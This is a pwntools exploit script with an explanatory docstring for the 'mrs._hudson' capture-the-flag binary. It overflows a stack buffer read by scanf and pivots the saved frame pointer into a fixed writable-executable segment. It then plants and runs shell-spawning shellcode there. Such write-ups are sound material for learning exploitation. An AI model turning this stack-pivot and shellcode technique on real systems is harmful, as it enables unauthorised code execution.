#!/usr/bin/env python2
"""
Vulnerability

the relevant code for this challenge looks like this:

0x0040066f      488d4590       lea rax, [rbp - 0x70]
0x00400673      4889c6         mov rsi, rax          ; rsi - first argument - buffer of size 0x70
0x00400676      bf2b074000     mov edi, 0x40072b A   ; edi - second argument - reference to string "%s"
0x0040067b      b800000000     mov eax, 0
0x00400680      e89bfeffff     call sym.imp.__isoc99_scanf
0x00400685      c9             leave
0x00400686      c3             ret

or in C:

  char buf[0x70];
  scanf("%s", &buf);
  return;

As the length of the input is not checked, this is a straight forward buffer overflow.
There is an readable-writeable-executable segment at a fixed location where we can store & execute
the shellcode.
"""
from pwn import *

exe = context.binary = ELF("./mrs._hudson")
conn = exe.process()
#conn = remote("178.62.249.106", 8642)

conn.recvline_contains("Let's go back to 2000.")

# this is the location where the `scanf` call starts in the above assembly
read = p64(0x0040066f)

### Exploit

# Using PEDA, we see that the binary has an RWX segment at fixed location:
#
# gdb-peda$ vmmap
# Start              End                Perm	Name
# 0x00400000         0x00401000         r-xp	/code/asisctf/mrhudson/mrs._hudson
# 0x00600000         0x00601000         r-xp	/code/asisctf/mrhudson/mrs._hudson
# 0x00601000         0x00602000         rwxp	/code/asisctf/mrhudson/mrs._hudson
# ...
#
# The idea is to write our shellcode into that segment and then jump to it to execute it.
# Let's save the location of that segment into a variable:
base = 0x601000
bufsize = 0x70

## Stack pivot
#
# To store our shellcode at 0x601000, we overflow the buffer and set the saved RBP
# to 0x601000+0x70 and return back to the scanf. So after that, scanf will read our input
# to rbp-0x70 = 0x601000+0x70-0x70 = 0x601000
conn.sendline(fit({
    bufsize: [
        p64(base+0x70),  # saved rbp
        read,            # ret addr
    ]
}))

## Run shellcode
#
# Now, we send the input to the read: first, our shellcode and at offset +0x70 (this is where
# rbp points to now) we store a new rbp (dont care) and set the return address to 0x601000 (base)
# which will execute the shellcode
conn.sendline(fit({
    0x0: asm(shellcraft.sh(), vma=base),
    0x70: [
        p64(0xdeadba5e), # saved rbp
        p64(base)        # ret addr
    ]
}))

# enjoy your shell
conn.interactive()
